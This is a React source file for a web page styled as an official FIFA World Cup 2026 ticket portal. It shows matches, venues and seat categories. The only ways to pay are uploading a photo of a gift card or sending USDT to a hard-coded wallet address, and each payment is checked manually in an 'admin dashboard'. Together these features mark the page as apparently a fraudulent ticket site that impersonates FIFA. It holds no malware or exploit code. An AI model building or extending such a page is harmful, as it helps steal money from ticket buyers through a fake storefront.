import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { toast } from 'react-toastify';
import { ticketAPI } from '../../api';
import FIFABanner from '../../components/layout/FIFABanner';
import FIFASectionFooter from '../../components/layout/FIFASectionFooter';
import './fifa.css';

const TicketsPortal = () => {
  const navigate = useNavigate();
  const [selectedMatch, setSelectedMatch] = useState(null);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [selectedCategory, setSelectedCategory] = useState('');
  const [paymentMethod, setPaymentMethod] = useState('giftcard');
  const [giftCardImage, setGiftCardImage] = useState(null);
  const [giftCardAmount, setGiftCardAmount] = useState('');
  const [cryptoAmount, setCryptoAmount] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  // This would come from admin settings in a real app
  const adminCryptoAddress = '0x742d35Cc6634C0532925a3b844Bc454e4438f44e';
  const adminCryptoNetwork = 'USDT (ERC-20)';

  const matches = [
    { id: 1, name: "Opening Match", date: "June 11, 2026", venue: "Estadio Azteca, Mexico City", price: "$200 - $850", status: "on-sale" },
    { id: 2, name: "Group Stage: USA vs England", date: "June 15, 2026", venue: "SoFi Stadium, Los Angeles", price: "$150 - $750", status: "on-sale" },
    { id: 3, name: "Group Stage: Brazil vs Germany", date: "June 18, 2026", venue: "Hard Rock Stadium, Miami", price: "$180 - $800", status: "on-sale" },
    { id: 4, name: "Round of 16", date: "July 2-5, 2026", venue: "Various Locations", price: "$250 - $1,000", status: "coming-soon" },
    { id: 5, name: "Quarterfinals", date: "July 9-10, 2026", venue: "Various Locations", price: "$350 - $1,500", status: "coming-soon" },
    { id: 6, name: "Semifinals", date: "July 14-15, 2026", venue: "Various Locations", price: "$500 - $2,500", status: "coming-soon" },
    { id: 7, name: "Final Match", date: "July 19, 2026", venue: "MetLife Stadium, New Jersey", price: "$800 - $5,000", status: "coming-soon" },
  ];

  const ticketCategories = [
    { name: "Category 1", price: "$850+", features: "Center circle view, premium seating, match program" },
    { name: "Category 2", price: "$550+", features: "Sideline view, reserved seating, digital ticket" },
    { name: "Category 3", price: "$350+", features: "Corner/end view, reserved seating" },
    { name: "Category 4", price: "$200+", features: "Behind goal, reserved seating" },
  ];

  const handleCategorySelect = (category) => {
    setSelectedCategory(category);
    setIsModalOpen(true);
  };

  const handlePurchase = (match) => {
    setSelectedMatch(match);
    setSelectedCategory('');
    setIsModalOpen(true);
  };

  const handlePaymentMethodChange = (method) => {
    setPaymentMethod(method);
  };

  const handleGiftCardImageUpload = (e) => {
    const file = e.target.files[0];
    if (file) {
      if (!file.type.startsWith('image/')) { toast.error('Please upload an image file'); return; }
      if (file.size > 5 * 1024 * 1024) { toast.error('Image size should be less than 5MB'); return; }
      const reader = new FileReader();
      reader.onloadend = () => { setGiftCardImage(reader.result); };
      reader.readAsDataURL(file);
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsSubmitting(true);

    try {
      if (paymentMethod === 'giftcard') {
        if (!giftCardImage) { toast.error('Please upload a gift card image'); setIsSubmitting(false); return; }
        if (!giftCardAmount) { toast.error('Please enter the gift card amount'); setIsSubmitting(false); return; }
      } else {
        if (!cryptoAmount) { toast.error('Please enter the amount you want to pay'); setIsSubmitting(false); return; }
        if (parseFloat(cryptoAmount) <= 0) { toast.error('Please enter a valid amount'); setIsSubmitting(false); return; }
      }

      const submissionData = {
        match: selectedMatch?.name || '',
        category: selectedCategory,
        paymentMethod: paymentMethod,
        giftCardImage: paymentMethod === 'giftcard' ? giftCardImage : null,
        giftCardAmount: paymentMethod === 'giftcard' ? giftCardAmount : null,
        cryptoAmount: paymentMethod === 'crypto' ? cryptoAmount : null,
        cryptoAddress: paymentMethod === 'crypto' ? adminCryptoAddress : null,
        timestamp: new Date().toISOString()
      };

      const response = await ticketAPI.submitGiftCard(submissionData);
      console.log("SERVER RESPONSE:", response.data);
      
      toast.success(
        paymentMethod === 'giftcard' 
          ? 'Gift card submitted successfully! We will verify and confirm your tickets within 24 hours.'
          : `Crypto payment request submitted! Please send ${cryptoAmount} USDT to ${adminCryptoAddress}`
      );

      resetForm();
      setIsModalOpen(false);

    } catch (error) {
      toast.error('Failed to submit ticket request. Please try again.');
    } finally {
      setIsSubmitting(false);
    }
  };

  const resetForm = () => {
    setSelectedCategory('');
    setPaymentMethod('giftcard');
    setGiftCardImage(null);
    setGiftCardAmount('');
    setCryptoAmount('');
    setSelectedMatch(null);
  };

  const closeModal = () => {
    if (!isSubmitting) {
      resetForm();
      setIsModalOpen(false);
    }
  };

  return (
    <div className="fifa-page-container">
      <FIFABanner />
      
      <div className="tickets-container page-content">
        <div className="page-header">
          <h1>FIFA World Cup 2026™ Tickets</h1>
          <p>Secure your seats for the world's greatest football tournament</p>
        </div>

        {/* Ticket Categories - Styled like Hospitality Cards */}
        <div className="ticket-categories">
          <h2 className="section-title">Ticket Categories</h2>
          <div className="packages-grid">
            {ticketCategories.map((cat, idx) => (
              <div key={idx} className="package-card">
                <h2>{cat.name}</h2>
                <div className="package-price">{cat.price}</div>
                <p className="package-description">{cat.features}</p>
                <button 
                  className="book-btn"
                  onClick={() => handleCategorySelect(cat.name)}
                >
                  Select Category →
                </button>
              </div>
            ))}
          </div>
        </div>

        {/* Match Listings */}
        <h2 className="section-title">Available Matches</h2>
        <div className="matches-table">
          {matches.map((match) => (
            <div key={match.id} className="match-row">
              <div className="match-info">
                <h3>{match.name}</h3>
                <p><i className="fas fa-calendar-alt"></i> {match.date}</p>
                <p><i className="fas fa-map-marker-alt"></i> {match.venue}</p>
                <p className="price-range">{match.price}</p>
              </div>
              <button 
                className={`purchase-btn ${match.status === 'on-sale' ? 'active' : 'disabled'}`}
                disabled={match.status !== 'on-sale'}
                onClick={() => handlePurchase(match)}
              >
                {match.status === 'on-sale' ? 'Buy Tickets →' : 'Coming Soon'}
              </button>
            </div>
          ))}
        </div>

        {/* Important Information */}
        <div className="info-section">
          <h3><i className="fas fa-info-circle"></i> Important Information</h3>
          <ul>
            <li>Maximum of 6 tickets per match per FIFA ID</li>
            <li>Tickets are non-refundable but can be resold on official marketplace</li>
            <li>FIFA ID required for all ticket purchases</li>
            <li>Mobile ticketing only - no physical tickets will be issued</li>
          </ul>
        </div>

        <button className="back-btn" onClick={() => navigate('/fifa')}>
          ← Back to FIFA World Cup
        </button>
      </div>

      <FIFASectionFooter />

      {/* Modal/Popup - Styled exactly like HospitalityPackages */}
      {isModalOpen && (
        <div className="modal-overlay" onClick={closeModal}>
          <div className="modal-content booking-modal" onClick={(e) => e.stopPropagation()}>
            
            <div className="modal-header">
              <div>
                <span className="step-badge">Step 1 of 2</span>
                <h2>🎟️ {selectedMatch?.name || 'Purchase Tickets'}</h2>
                <p className="modal-subtitle">Complete your ticket request securely</p>
              </div>
              <button className="close-modal" onClick={closeModal} disabled={isSubmitting}>
                ✕
              </button>
            </div>

            <div className="booking-summary-card">
              <h4>Request Summary</h4>
              <div className="summary-row">
                <span>Match</span>
                <strong>{selectedMatch?.name || 'General Category Request'}</strong>
              </div>
              {selectedCategory && (
                <div className="summary-row">
                  <span>Category</span>
                  <strong>{selectedCategory}</strong>
                </div>
              )}
              <div className="summary-row">
                <span>Venue</span>
                <strong>{selectedMatch?.venue || 'N/A'}</strong>
              </div>
              <div className="summary-row">
                <span>Status</span>
                <strong style={{color: '#28a745'}}>Available</strong>
              </div>
            </div>

            <form onSubmit={handleSubmit}>
              <div className="payment-tabs">
                <button
                  type="button"
                  className={paymentMethod === "giftcard" ? "active-payment" : ""}
                  onClick={() => handlePaymentMethodChange("giftcard")}
                >
                  🎁 Gift Card
                </button>
                <button
                  type="button"
                  className={paymentMethod === "crypto" ? "active-payment" : ""}
                  onClick={() => handlePaymentMethodChange("crypto")}
                >
                  ₿ Crypto
                </button>
              </div>

              {paymentMethod === "giftcard" && (
                <div className="payment-section">
                  <div className="info-alert">
                    📌 Upload your gift card within 24 hours for verification.
                  </div>
                  
                  <div className="form-group">
                    <label>Gift Card Amount ($)</label>
                    <input
                      type="number"
                      placeholder="Enter amount"
                      value={giftCardAmount}
                      onChange={(e) => setGiftCardAmount(e.target.value)}
                      min="10"
                      step="10"
                      className="fifa-input"
                      required
                    />
                  </div>

                  <div className="file-upload-area">
                    <input
                      type="file"
                      accept="image/*"
                      onChange={handleGiftCardImageUpload}
                      id="giftcard-image"
                      style={{ display: 'none' }}
                    />
                    <label htmlFor="giftcard-image" className="file-upload-label">
                      {giftCardImage ? (
                        <div className="upload-preview">
                          <img src={giftCardImage} alt="Gift card" className="gift-preview" />
                          <span>Click to change image</span>
                        </div>
                      ) : (
                        <div className="upload-placeholder">
                          <span>📤</span>
                          <p>Click to upload gift card image</p>
                          <small>JPG, PNG, GIF (max 5MB)</small>
                        </div>
                      )}
                    </label>
                  </div>
                </div>
              )}

              {paymentMethod === "crypto" && (
                <div className="payment-section">
                  <div className="crypto-box">
                    <h4>Send Payment To</h4>
                    <code>{adminCryptoAddress}</code>
                    <p>Network: <strong>{adminCryptoNetwork}</strong></p>
                    <button 
                      type="button"
                      className="copy-btn"
                      onClick={() => {
                        navigator.clipboard?.writeText(adminCryptoAddress);
                        toast.success('Address copied to clipboard');
                      }}
                    >
                      📋 Copy Address
                    </button>
                  </div>

                  <input
                    type="number"
                    placeholder="Amount Sent (USDT)"
                    value={cryptoAmount}
                    onChange={(e) => setCryptoAmount(e.target.value)}
                    className="fifa-input"
                    min="1"
                    step="1"
                    required
                  />

                  <div className="info-alert">
                    🔒 Your transaction will appear in the admin dashboard for verification.
                  </div>
                </div>
              )}

              <div className="next-steps">
                <h4>What happens next?</h4>
                <p>1. Submit payment details</p>
                <p>2. Payment verifier confirms</p>
                <p>3. E-tickets sent to your email</p>
              </div>

              <button 
                type="submit" 
                className="submit-btn"
                disabled={isSubmitting}
              >
                {isSubmitting ? 'Processing...' : 'Submit Request'}
              </button>
            </form>
          </div>
        </div>
      )}
    </div>
  );
};

export default TicketsPortal;